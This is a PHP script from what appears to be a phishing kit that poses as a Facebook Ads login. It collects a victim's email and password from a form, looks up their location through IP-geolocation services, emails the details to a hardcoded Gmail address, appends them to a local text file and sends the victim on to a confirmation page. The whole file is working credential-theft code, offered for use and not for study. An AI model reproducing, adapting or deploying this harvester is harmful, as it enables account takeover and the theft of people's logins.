<?php


/*========== [ Variables ]==========*/
$ip_address = $_SERVER['REMOTE_ADDR'];
$email   = $_POST['email'];
$pass   = $_POST['pass'];
$today = date("F j, Y, g:i a");
/*========== [ Variables ]==========*/


$message = "ACCOUNT INFORMATION
====💲💲💲==== 💰💰💰 ADS TEAM 💰💰💰=====💲💲💲====
Email      : $email
Sandi      : $pass
IP	       : $ip_address
DAY	       : $today
====💲💲💲==== 💰💰💰 THANK'S YOU 💰💰💰=====💲💲💲====";


$to = "tukangpku@gmail.com"; // Email Here
$subject = "ADS TEAM ACCOUNT = [$ip]";
$headers = "From: FacebookADS <tukangpku@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Gasskan2023: 1.0\n";

mail($to, $subject, $message,$headers);

$file = "suksesbilliard.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip_address = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$host = 'http://www.geoplugin.net/php.gp?ip=' . $_SERVER['REMOTE_ADDR'];
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];

function fetch($host) {
    if (function_exists('curl_init')) {
        // Gunakan cURL untuk mengambil data
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $host);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
        $response = curl_exec($ch);
        curl_close($ch);
    } else if (ini_get('allow_url_fopen')) {
        // Fallback ke fopen()
        $response = file_get_contents($host, 'r');
    } else {
        trigger_error('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
        return;
    }
    return $response;
}

$api_url = "http://ip-api.com/json/{$ip_address}";
$response = file_get_contents($api_url);
$data = json_decode($response, true);

if ($data && $data['status'] == 'success') {
    $country = $data['country'];
} 

$handle = fopen($file, 'a');
fwrite($handle, "========================================");
fwrite($handle, "\n");
fwrite($handle, "::  Email         :: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "::  Sandi         :: ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "::  IP ADDRES     :: ");           
fwrite($handle, "$ip_address ");
fwrite($handle, "\n");
fwrite($handle, "::  JAM MASUK     :: ");     
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA        :: ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"confirm.html\";
// -->
</script>";
?>